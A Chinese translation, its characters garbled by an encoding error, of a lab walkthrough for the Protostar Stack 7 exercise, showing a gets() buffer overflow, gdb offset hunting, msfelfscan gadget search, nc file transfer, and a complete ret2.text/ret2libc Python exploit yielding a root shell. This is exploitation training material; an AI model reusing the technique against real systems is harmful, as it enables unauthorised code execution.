# [ExpDev]æ¼æ´åˆ©ç”¨ç»ƒä¹ |åŸæ’æ˜Ÿ|å †æ ˆ 7

> åŸæ–‡ï¼š<https://infosecwriteups.com/expdev-exploit-exercise-protostar-stack-7-fea3ac85ffe7?source=collection_archive---------2----------------------->

![](img/5daa8834def48d98dfe4517172fa1f79.png)

# å †æ ˆ 7 (ret2.text)

æ­¤æŒ‘æˆ˜çš„ç›®æ ‡æ˜¯ç»•è¿‡å¯¹è¿”å›åœ°å€çš„é™åˆ¶ï¼Œå¹¶å¯¼è‡´ä»»æ„ä»£ç æ‰§è¡Œã€‚å¯¹è¿”å›åœ°å€çš„é™åˆ¶å°†é˜»æ­¢æˆ‘ä»¬ä½¿ç”¨ä»»ä½•ä»¥`0xb`å¼€å¤´çš„åœ°å€ã€‚

æ‰€ä»¥ä»[æ ˆ 6](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6) å†™èµ·ï¼Œç”±äºæˆ‘ä»¬æ— æ³•ä½¿ç”¨æ ˆä¸­çš„ä»»ä½•åœ°å€(`0xbf`)ï¼Œæˆ‘ä»¬åˆ©ç”¨ ret2libc æŠ€æœ¯åˆ©ç”¨äº†ä¸€ä¸ª libc å°å·¥å…·(ä½äº`0xb7`)ã€‚ç„¶è€Œï¼Œå¯¹äºæ ˆ 7ï¼Œæˆ‘ä»¬ä¹Ÿè¢«é™åˆ¶ä¸€èµ·ä½¿ç”¨ä½äº`0xb`çš„ä»»ä½•åœ°å€ã€‚

ä¸ºäº†é¿å…è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨å¦ä¸€ç§ç§°ä¸º return to çš„é¢å‘è¿”å›çš„ç¼–ç¨‹(â€œROPâ€)æŠ€æœ¯ã€‚æ–‡æœ¬(" ret2.text ")ã€‚

*   é“¾æ¥:[https://exploit-exercises.lains.space/protostar/stack7/](https://exploit-exercises.lains.space/protostar/stack7/)

![](img/b5ba61954296f4aa475765920b313d78.png)

## æ³¨æ„äº‹é¡¹

*   `gets(buffer);`:å¼±åŠ¿ç¾¤ä½“ã€‚å®ƒä» stdin ä¸­è¯»å–ä¸€è¡Œï¼Œä½†ä¸æ£€æŸ¥ç¼“å†²åŒºæº¢å‡ºâ†’è¿™å®¹æ˜“å—åˆ° BOF ç±»å‹çš„æ”»å‡»ã€‚
*   `char buffer[64];`:è¿™å°†æˆ‘ä»¬çš„ç¼“å†²é•¿åº¦é™åˆ¶ä¸º 64 å­—èŠ‚ã€‚â†’æˆ‘ä»¬å¯ä»¥è¾“å…¥è¶…è¿‡ 64 ä¸ªå­—èŠ‚æ¥å¼•èµ· BOFã€‚
*   `if((ret & 0xb0000000) == 0xb0000000)`:è¿™æ˜¯å¯¹åœ¨`0xb0000000 â€” 0xbfffffff`ä½ç½®ä¹‹é—´ä½¿ç”¨ä»»ä½•è¿”å›åœ°å€çš„é™åˆ¶ã€‚(è¯·æŸ¥çœ‹æˆ‘çš„ [Stack 6](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6) æ–‡ç« ï¼Œäº†è§£ç¨‹åºæ˜¯å¦‚ä½•é™åˆ¶ä½¿ç”¨è¿™äº›åœ°å€çš„ã€‚)

![](img/5af7b957d116c3906ebd9bf459f9e3a5.png)

# æ¼æ´åˆ©ç”¨(ret2.text)

ä¸ºäº†è§„é¿è¿™ç§ç±»å‹çš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ ROP é“¾æ”»å‡»ï¼Œç‰¹åˆ«æ˜¯ ret2.text æŠ€æœ¯ã€‚ç®€å•åœ°è¯´ï¼Œç”±äºæˆ‘ä»¬å¯¹è·³è½¬åˆ°ä»»ä½•å †æ ˆæˆ– libc åœ°å€éƒ½æœ‰é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥è½¬è€Œè·³è½¬åˆ°ç¨‹åºçš„`.text`éƒ¨åˆ†(=ç¨‹åºçš„ ASM ä»£ç æ‰€åœ¨çš„åœ°æ–¹)å¹¶åˆ©ç”¨ä¸€ä¸ªç‰¹æ®Šçš„å°å·¥å…·(=ä»¥`POP, POP, RET`çš„`RET`ç»“å°¾çš„ä¸€å°æ®µæŒ‡ä»¤åºåˆ—)æ¥è·å¾—ä»£ç æ‰§è¡Œã€‚

ä¸ºæ­¤ï¼Œæˆ‘ä»¬éœ€è¦å…·å¤‡ä»¥ä¸‹å…ˆå†³æ¡ä»¶:

1.  âœ…è·å¾—å¯¹ç­¹ç çš„å®Œå…¨æ§åˆ¶æƒ`EIP`ã€‚
2.  âœ…åœ¨ç¨‹åºä¸Šæ‰¾åˆ°å¯ç”¨çš„`POP, POP, RET`å°å·¥å…·ã€‚
3.  éœ€è¦ç¦ç”¨âœ…æ•°æ®æ‰§è¡Œä¿æŠ¤(â€œDEPâ€)ã€‚

## å¯»æ‰¾ EIP åç§»

è®©æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª python è„šæœ¬æ¥æ‰¾åˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„åç§»å€¼`EIP`:

```
#!/usr/bin/pythonpadding = "A" * 70
padding+= "BBBBCCCCDDDDEEEEFFFFGGGG"print padding
```

ç„¶åï¼Œåœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­åˆ›å»ºä¸€ä¸ªæ¼æ´åˆ©ç”¨çš„è¾“å‡ºï¼Œä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ç”¨ gdb è¿è¡Œå®ƒã€‚

```
$ python exploit.py > /tmp/stack7/exploit
```

ç°åœ¨ï¼Œè¿è¡Œ gdb å¹¶æä¾›æ¼æ´æ–‡ä»¶ã€‚

```
**$ gdb -q stack7**
  Reading symbols from /opt/protostar/bin/stack7...done.
**(gdb) break * main**
  Breakpoint 1 at 0x804854b: file stack7/stack7.c, line 28.
**(gdb) run < /tmp/stack7/exploit**
  Starting program: /opt/protostar/bin/stack7 < /tmp/stack7/exploit Breakpoint 1, main (argc=1, argv=0xbffff854) at stack7/stack7.c:28
  28 in stack7/stack7.c
**(gdb) continue**
  Continuing.
  input path please: got path
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDEEAABBBBCCCCDDDDEEEEFFFFGGGG Program received signal SIGSEGV, Segmentation fault.
 **0x45454444** in ?? ()
```

â€œ0x44â€å’Œâ€œ0x45â€åœ¨ ASCII è¡¨ç¤ºä¸­åˆ†åˆ«æ˜¯â€œDâ€å’Œâ€œEâ€ã€‚å› æ­¤ï¼Œåç§»é‡ä¸º 80 (= 70 + "BBBBCCCCDD ")ã€‚

```
**...
(gdb) continue**
  Continuing.  Program received signal SIGSEGV, Segmentation fault.
  **0x44444343** in ?? ()                             
**(gdb) info registers** eax            0x804a008 134520840
  ecx            0x0 0
  edx            0x3 3
  ebx            0xb7fd7ff4 -1208123404
  esp            0xbffff7a0 0xbffff7a0
  ebp            0x44444343 0x44444343
  esi            0x0 0
  edi            0x0 0
  **eip            0x45454444 0x45454444       <---- EIP Overflowed**
  eflags         0x210206 [ PF IF RF ID ]
```

æ­¤å¤–ï¼Œç°åœ¨æˆ‘ä»¬å¯ä»¥åœ¨å´©æºƒæ—¶æ§åˆ¶`EIP`,è¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è·³è½¬åˆ°å †æ ˆä¸­æˆ‘ä»¬å¸Œæœ›çš„ä»»ä½•ä½ç½®ã€‚

## æŸ¥æ‰¾ POP POP RET å°å·¥å…·

ç½‘ç«™ä¸Šçš„æç¤ºè¯´ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“åœ°åˆ©ç”¨åä¸ºâ€œmsfelfscanâ€çš„å·¥å…·è·å¾—åˆé€‚çš„æŒ‡ä»¤ã€‚è®©æˆ‘ä»¬å…ˆæŠŠæ ˆ 7 è½¬ç§»åˆ°æˆ‘ä»¬çš„ç›’å­é‡Œã€‚

```
**### Moving Stack7****## On your Kali box**
$ nc -lvnp 8000 > stack7**## On the Protostar box**
$ nc 192.168.117.144 8000 < /opt/protostar/bin/stack7
```

ä¸€æ—¦å®ƒè¢«ä¼ è¾“åˆ°æ‚¨çš„ç›’å­ï¼Œè¿è¡Œâ€œmsfelfscanâ€æ¥æ‰¾åˆ°`POP, POP, RET`å°å·¥å…·ã€‚

```
**### msfelfscan**$ /usr/share/framework2/msfelfscan -s -f stack7
**0x080485c7   edi ebp ret
0x08048492   ebx ebp ret
0x080485f7   ebx ebp ret**
```

## æ¼æ´è„šæœ¬

æ‰€ä»¥ç°åœ¨æˆ‘ä»¬æœ‰äº†ä¸Šé¢çš„ 3 ä¸ª`POP, POP, RET`å°å·¥å…·åœ°å€(è¿™ 3 ä¸ªåœ°å€ä¸­çš„ä»»ä½•ä¸€ä¸ªéƒ½åŒæ ·æœ‰æ•ˆ)ã€‚è¿™ç§é»‘é­”æ³•æ˜¯è¿™æ ·è¿ä½œçš„:

```
**### ğŸš¨ Exploit Execution Flow**1) Padding = "A" * 80
2) EIP = **0x080485c7** (POP, POP, RET)
3) POP = 4 bytes of junk
4) POP = 4 bytes of junk
5) RET = ****JMP to the address that we wish to**
         [Option #1]** "\x90" * 80 + shellcode of /bin/sh **[Option #2]** libc /bin/sh syscall
```

è®©æˆ‘ä»¬æŠŠä¸€åˆ‡æ”¾åœ¨ä¸€èµ·ï¼Œåˆ›é€ æˆ‘ä»¬çš„åˆ©ç”¨ã€‚æˆ‘ä»¬å°†ä½¿ç”¨**ã€é€‰é¡¹# 2ã€‘**æ–¹æ³•ä»¥ root ç”¨æˆ·èº«ä»½è·å¾— shell è®¿é—®æƒé™:

```
**[exploit.py]**#!/bin/usr/pythonimport structpadding = "A" * 80
padding+= "\xc7\x85\x04\x08"          **# 0x080485c7 (POP, POP, RET)**
padding+= "BBBB"                      **# 1st POP w/ junk**
padding+= "CCCC"                      **# 2nd POP w/ junk****# Using the following to confirm code execution for SIGTRA**P
#padding+= "\xd8\xf7\xff\xbf"         **# 0xbffff7d8 (Middle of NOP)**
#padding+= "\x90" * 80
#padding+= "\xCC" * 4                 **# int3 to cause SIGTRAP****# libc /bin/sh (*Check** [**Stack6**](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-stack-6-ef75472ec7c6) **to see how I got those addresses)**
system = struct.pack("I", 0xb7ecffb0)
ret = "\x90" * 4
shell = struct.pack("I", 0xb7e97000 + 0x11f3bf)print padding + system + ret + shell
```

ä¸€æ—¦æˆ‘ä»¬ä½¿ç”¨`cat`æŠ€å·§è¿è¡Œä¸Šè¿°æ¼æ´åˆ©ç”¨è„šæœ¬ï¼Œæ— éœ€å¼•å…¥ä»»ä½•å¤–å£³ä»£ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥æˆåŠŸåœ°æ‰“å¼€ä¸€ä¸ªå…·æœ‰ root æƒé™çš„`/bin/sh`å¤–å£³ã€‚

```
$ (python /tmp/stack7/exploit.py; cat) | ./stack7
```

![](img/4dbd025722592becf78957eb1d3368fa.png)

æ„Ÿè°¢é˜…è¯»ï¼

## ä¸‹ä¸€ä¸ªæŒ‘æˆ˜:

*   [**æ ¼å¼ 0**](https://medium.com/@bigb0ss/expdev-exploit-exercise-protostar-format-0-332983bfd388) â€”æ ¼å¼å­—ç¬¦ä¸²å¼€å‘ç®€ä»‹

![](img/29d7b05693983916f565e42fc1ce4afe.png)